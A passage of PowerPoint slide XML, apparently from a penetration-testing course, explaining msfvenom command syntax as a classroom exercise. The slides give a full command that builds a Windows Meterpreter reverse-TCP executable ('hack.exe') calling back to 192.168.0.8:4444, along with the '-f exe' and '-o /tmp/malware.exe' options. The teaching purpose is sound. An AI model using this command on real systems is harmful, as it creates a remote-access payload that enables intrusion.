            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>designates the encoder we’ll use.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="553" name="Google Shape;553;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="2175225" y="1379775"/>
            <a:ext cx="105600" cy="1967700"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1009250" y="3119750"/>
            <a:ext cx="105600" cy="282900"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="555" name="Google Shape;555;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="620550" y="2065575"/>
            <a:ext cx="105600" cy="596100"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3478925" y="3047150"/>
            <a:ext cx="105600" cy="428100"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="557" name="Google Shape;557;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="4451400" y="1722075"/>
            <a:ext cx="105600" cy="1283100"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5214350" y="3455800"/>
            <a:ext cx="1283100" cy="1065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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-f exe</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="00FFFF"/>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chemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>indicates the file type to create.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In this case, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="559" name="Google Shape;559;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5418950" y="3071000"/>
            <a:ext cx="105600" cy="380400"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="560" name="Google Shape;560;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="6214225" y="1878675"/>
            <a:ext cx="105600" cy="969900"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6247975" y="1400175"/>
            <a:ext cx="2302200" cy="7875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rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-o /tmp/malware.exe</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>creates an output file, naming the file (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>malware.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>) and location (inside the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>/tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>directory).</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="562" name="Google Shape;562;p74"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4504200" y="1520150"/>
            <a:ext cx="0" cy="790800"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="563" name="Google Shape;563;p74"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673350" y="1520150"/>
            <a:ext cx="0" cy="790800"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>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7" name="Shape 567"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="568" name="Google Shape;568;p75"/>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569" name="Google Shape;569;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="412259" y="95716"/>
            <a:ext cx="9144000" cy="3936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b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t> Command Syntax</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570" name="Google Shape;570;p75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="194725" y="2062152"/>
            <a:ext cx="8754900" cy="764400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 10369" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>LHOST=192.168.0.8 LPORT=4444</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-f exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>R &gt; hack.exe</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata Medium"/>
              <a:ea typeface="Inconsolata Medium"/>
              <a:cs typeface="Inconsolata Medium"/>
              <a:sym typeface="Inconsolata Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="571" name="Google Shape;571;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="667500"/>
            <a:ext cx="8613900" cy="513000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We used this command in the preceding demo. How would you break it down?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>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5" name="Shape 575"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="576" name="Google Shape;576;p76"/>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577" name="Google Shape;577;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336059" y="95716"/>
            <a:ext cx="9144000" cy="3936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b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t> Command Syntax</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="578" name="Google Shape;578;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="194725" y="2062152"/>
            <a:ext cx="8754900" cy="764400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 10369" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>LHOST=192.168.0.8 LPORT=4444</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-f exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>R &gt; hack.exe</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata Medium"/>
              <a:ea typeface="Inconsolata Medium"/>
              <a:cs typeface="Inconsolata Medium"/>
              <a:sym typeface="Inconsolata Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="579" name="Google Shape;579;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="146400" y="667504"/>
            <a:ext cx="8262900" cy="513000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Answer:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
